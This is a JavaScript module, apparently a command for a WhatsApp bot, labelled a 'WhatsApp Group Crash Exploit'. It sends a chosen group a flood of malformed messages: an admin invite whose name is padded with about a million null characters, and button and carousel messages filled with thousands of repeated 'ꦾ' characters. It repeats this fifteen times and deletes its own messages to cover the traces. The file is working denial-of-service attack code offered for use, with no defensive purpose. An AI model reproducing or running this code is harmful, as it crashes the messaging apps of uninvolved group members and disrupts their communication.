// gcbug.js - WhatsApp Group Crash Exploit
// By No Name Dev

import channelSender from '../commands/channelSender.js'

async function bug1(message, client, target) {
    const remoteJid = target;
    await client.sendMessage(remoteJid, {
        adminInvite: {
            jid: `120363425431833423@newsletter`,
            name: "✘ No Name Dev Crasher ✘" + "\u0000".repeat(1020000),
            caption: "Just Another Dev On The Internet",
            expiration: Date.now() + 1814400000,
        },
    });
}

async function clear(message, client) {
    const remoteJid = message.key.remoteJid;
    await client.chatModify({
        delete: true,
        lastMessages: [
            {
                key: message.key,
                messageTimestamp: message.messageTimestamp
            }
        ]
    }, remoteJid);
}

async function bug2(message, client, target) {
    const remoteJid = target;
    const groupMetadata = await client.groupMetadata(target);
    const participants = groupMetadata.participants.map(user => user.id);

    await client.sendMessage(remoteJid, {
        image: { url: "4.png" },
        caption: "☥ No Name Dev Crasher ☥",
        footer: "☥  🌹 ☥",
        media: true,
        interactiveButtons: [
            {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                    display_text: `🌹 ${"ꦾ".repeat(29000)}\n\n`,
                    id: "refresh"
                })
            },
            {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                    display_text: `Je t'aime ${"ꦾ".repeat(29000)}\n\n`,
                    id: "info"
                })
            },
            {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `Te amo ${"ꦾ".repeat(29000)}\n\n`,
                    url: "https://example.com"
                })
            },
        ]
    }, {
        quoted: message,
        mentions: participants
    });
}

async function bug3(message, client, target) {
    const remoteJid = target;
    const virus = "ꦾ".repeat(2000);

    const lastBug = await client.sendMessage(remoteJid, {
        text: "✘ No Name Dev Crasher ✘",
        footer: "🌹 🌹",
        cards: [
            {
                image: { url: '4.png' },
                title: '✘ No Name Dev Crasher ✘',
                caption: 'Just another dev on the internet',
                footer: "🌹 🌹",
                buttons: [
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                ]
            },
            {
                image: { url: '4.png' },
                title: '✘ No Name Dev Crasher ✘',
                caption: 'Just another dev on the internet',
                footer: "🌹 🌹",
                buttons: [
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                ]
            },
            {
                image: { url: '4.png' },
                title: '✘ No Name Dev Crasher ✘',
                caption: 'Just another dev on the internet',
                footer: "🌹 🌹",
                buttons: [
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) },
                ]
            }
        ]
    }, { quoted: message });

    return lastBug;
}

async function gcbug(message, client, context = {}) {
    const { target: passedTarget, args = [] } = context;
    const remoteJid = message.key.remoteJid;
    let target;

    if (passedTarget) {
        target = args.find(a => a.endsWith("@g.us")) || passedTarget + "@g.us";
    } else if (args.length > 0 && args[0].endsWith("@g.us")) {
        target = args[0];
    } else if (remoteJid.endsWith("@g.us")) {
        target = remoteJid;
    } else {
        await client.sendMessage(remoteJid, {
            text: `> _*Utilise cette commande dans un groupe ou spécifie un ID de groupe.*_\n> _*Exemple : .gcbug 123456789-123456@g.us*_`,
            quoted: message
        });
        return;
    }

    await client.sendMessage(remoteJid, {
        text: `> _*💥 Attaque en cours sur le groupe...*_`,
        quoted: message
    });

    for (let i = 0; i < 15; i++) {
        try {
            await bug2(message, client, target);
            await bug3(message, client, target);
            const msg = await bug3(message, client, target);
            await clear(msg, client);
            await new Promise(resolve => setTimeout(resolve, 2000));
        } catch (e) {
            console.error("Erreur dans la boucle :", e.message);
        }
    }
}

export default gcbug;
